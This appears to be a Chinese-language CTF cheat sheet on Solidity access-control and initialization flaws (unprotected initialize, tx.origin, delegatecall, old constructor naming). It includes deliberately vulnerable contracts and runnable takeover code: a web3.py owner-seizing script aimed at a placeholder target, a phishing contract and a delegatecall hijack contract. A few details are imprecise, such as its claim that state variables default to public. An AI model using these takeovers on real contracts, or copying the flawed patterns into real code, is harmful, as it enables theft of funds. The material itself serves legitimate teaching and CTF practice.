---
title: Solidity 权限与初始化漏洞（SWC-105/106/108/118）
category: blockchain
tags: [solidity, 权限控制, 初始化, swc-105, delegatecall, ctf]
signals: [构造函数没有权限, onlyOwner 未加, 初始化函数 initializer, initialize 可重复调用, tx.origin, 未保护的 selfdestruct, 状态变量默认 public, 代理合约, delegatecall]
difficulty: medium
source: "SWC Registry / CTF-Wiki"
tools: [solidity, foundry, web3py]
updated: 2026-10-22
---

## 一、识别信号（题面长什么样）

- 合约里有 `function init()` / `initialize()`，**没有 `initializer` 修饰器**，且没有任何访问控制。
- `isOwner` / `onlyOwner` 检查漏了某个函数（如 `transferOwnership`、`changeOwner`）。
- 构造函数名与合约名不一致（Solc < 0.4.22 之前构造函数用函数名），或 `visibility` 未写（默认 public）。
- CTF 判定 `owner == player`，需要改 ownership。
- 有 `delegatecall`，且目标地址可控（可读写调用者的存储）。
- 关键词：owner、initialize、delegatecall、selfdestruct、tx.origin。

## 二、原理

| 弱点 | 表现 | 利用 |
|---|---|---|
| SWC-105 未保护转账 | `withdraw()` 没 `onlyOwner` | 直接调用，转走 ETH |
| SWC-106 未保护 `selfdestruct` | 任何人可 `kill()` | 合约自毁，锁死资金/绕过判定 |
| SWC-108 变量默认可见性 | `uint x;` 默认 public | 读私有数据 + 覆盖 |
| SWC-118 构造器命名错误 | `function Xxx()` 是普通函数 | 任何人可"重新构造"变量 |
| 代理初始化未加锁 | `initialize()` 可重入 | 抢占 owner / 改实现地址 |
| `tx.origin` 授权 | `require(tx.origin == owner)` | 钓鱼合约中转调用 |
| `delegatecall` 任意目标 | 调恶意合约 | 恶意合约写 SLOT 0 改 owner |

## 三、解题步骤

1. 检查每个外部可调用函数的修饰器（`onlyOwner`、`requires`）。
2. 检查 `initialize` 是否只能调一次。
3. 检查 `delegatecall` 的目标是否可控。
4. 检查 `tx.origin` 用法。
5. 改 owner / 抽干资金 / 自毁。

## 四、可直接运行的脚本

未保护 initialized 的代理：

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Proxy {
    address public owner;     // slot 0
    address public impl;      // slot 1
    constructor(address _impl) { impl = _impl; }
    function initialize() external {
        owner = msg.sender;   // ← 没有 initializer 守卫，新部署的 proxy 谁先调谁得
    }
    fallback() external payable {
        (bool ok, ) = impl.delegatecall(msg.data);
        require(ok);
    }
}
```

```python
from web3 import Web3
w3 = Web3(Web3.HTTPProvider("http://TARGET:8545"))
proxy = w3.eth.contract(address="0xPROXY", abi=[{
    "name": "initialize", "type": "function", "stateMutability": "nonpayable",
    "inputs": [], "outputs": []}])
proxy.functions.initialize().transact({"from": w3.eth.accounts[0]})
print("owner now:", "0x" + w3.eth.get_storage_at("0xPROXY", 0).hex()[-40:])
```

`tx.origin` 钓鱼：

```solidity
contract Victim {
    address owner;
    function transferOwnership(address n) external {
        require(tx.origin == owner, "not owner");   // ← tx.origin 可被中转
        owner = n;
    }
}
contract Phisher {
    Victim v;
    constructor(address a) { v = Victim(a); }
    function attack(address newOwner) external { v.transferOwnership(newOwner); }
    // 让 owner 本人调用 attack()，即可把 owner 改成 newOwner
}
```

`delegatecall` 劫持：

```solidity
contract Evil {
    address public owner;                 // 覆盖 slot 0
    function pwn() external { owner = msg.sender; }
}
contract Target {
    address public owner;
    function execute(address dest) external { dest.delegatecall(abi.encodeWithSignature("pwn()")); }
}
```

构造函数命名错误（老版本 Solidity）：

```solidity
pragma solidity ^0.4.20;
contract Ownable {
    address owner;
    function Ownable() public { owner = msg.sender; }   // ← 应是 constructor()
}
// 攻击：直接调用 Ownable()，把自己设成 owner（若有额外逻辑）
```

Foundry 测试：

```solidity
function testTakeover() public {
    Proxy p = new Proxy(address(impl));
    vm.prank(attacker);
    p.initialize();
    assertEq(p.owner(), attacker);
}
```

## 五、常见坑 / 变体

- **`initializer` 修饰器**：OpenZeppelin 的 `initializer` 用 `_initialized` 标记，新代理上调用是"一次"，但被 `delegatecall` 到实现时可能重复。
- **存储布局冲突**：代理与实现合约的 slot 顺序不一致，`delegatecall` 会写错位置（经典 Proxy Storage Collision）。
- **`tx.origin` 与 `msg.sender`**：只有 `tx.origin` 能被钓鱼；`msg.sender` 不行。
- **`selfdestruct` 未保护**：Solidity 0.8.18 起 `selfdestruct` 语义变化（只在同交易内销毁），但 CTF 老题依然生效。
- **`public` 默认可见性**：0.5.0 起必须显式写 `public/external/internal/private`，但 `private` 变量仍可读（见 `evm-storage-slot.md`）。
- 变体：**`onlyOwner` 写在 modifier 里但漏了 `_;`** 导致逻辑不执行。
- 变体：**函数选择器冲突**（两个函数选 4 字节相同）。
- 变体：**`is` 继承顺序**导致 `override` 错位（SWC-125）。

## 六、参考来源

- [SWC Registry - SWC-105/106/108/118 定义页](https://swcregistry.io/docs/SWC-105)
- [CTF-Wiki Delegatecall](https://ctf-wiki.org/blockchain/ethereum/attacks/delegatecall/)
- [CTF-Wiki Uninitialized Storage Pointer](https://ctf-wiki.org/blockchain/ethereum/attacks/uninitialized-storage-pointer/)
- [Solidity 文档 - 合约初始化与构造函数](https://docs.soliditylang.org/en/latest/contracts.html)
- [OpenZeppelin - Initializable 实现](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/proxy/utils/Initializable.sol)
